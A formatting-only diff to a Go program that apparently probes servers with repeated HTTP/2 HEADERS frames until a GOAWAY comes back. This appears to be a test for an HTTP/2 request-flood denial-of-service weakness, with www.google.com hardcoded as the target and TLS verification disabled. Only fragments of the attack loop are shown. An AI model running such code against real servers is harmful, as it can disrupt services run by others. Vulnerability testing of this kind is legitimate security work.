@@ -12,7 +12,7 @@ import (
 
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 
-func createHeaderFrameParam(url *url.URL, streamId uint32) (http2.HeadersFrameParam) {
+func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
 	var headerBlock bytes.Buffer
 
 	// Encode headers
@@ -31,13 +31,12 @@ func createHeaderFrameParam(url *url.URL, streamId uint32) (http2.HeadersFramePa
 	}
 }
 
-
 func main() {
 	serverUrl, err := url.Parse("https://www.google.com:443/")
 	if err != nil {
 		log.Fatalf("invalid server url: %v", err)
 	}
-	
+
 	connections := 1
 	skipVerify := true
 
@@ -82,7 +81,7 @@ func main() {
 		}
 
 		//at this point, the connection is established.
-		
+
 		attack(framer, serverUrl)
 		conn.Close()
 	}
@@ -115,7 +114,7 @@ func attack(framer *http2.Framer, url *url.URL) {
 			log.Println("wrote new HEADERS frame to start a new request...")
 		} else if frame.Header().Type == http2.FrameGoAway {
 			log.Printf("received GOAWAY. It seems like the server responded correctly.")
-			break;
+			break
 		}
 	}
 }
